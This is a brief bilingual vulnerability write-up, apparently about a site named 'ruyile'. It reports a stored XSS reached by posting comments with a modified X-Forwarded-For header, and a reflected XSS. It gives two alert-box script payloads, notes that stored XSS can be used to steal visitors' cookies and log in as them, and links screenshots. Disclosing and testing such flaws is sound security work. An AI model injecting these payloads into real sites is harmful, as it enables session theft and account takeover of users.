1、

存储型XSS，可以让访问页面的人，都会出现弹窗，进行获取用户cookie，进行登录的操作

通过发表评论，修改XFF

Storage based XSS allows users who access the page to pop up a pop-up window, retrieve user cookies, and perform login operations



Modify XFF by posting comments

![1702387276483](ruyile.assets/1702387276483.png)

payload:

~~~
<script>alert('XSS')</script>
~~~



![1702387233112](ruyile.assets/1702387233112.png)

![1702387312804](ruyile.assets/1702387312804.png)



2、Reflective xss

~~~
"><script>alert('XSS')</script>
~~~

![1702387453906](ruyile.assets/1702387453906.png)

![1702387508047](ruyile.assets/1702387508047.png)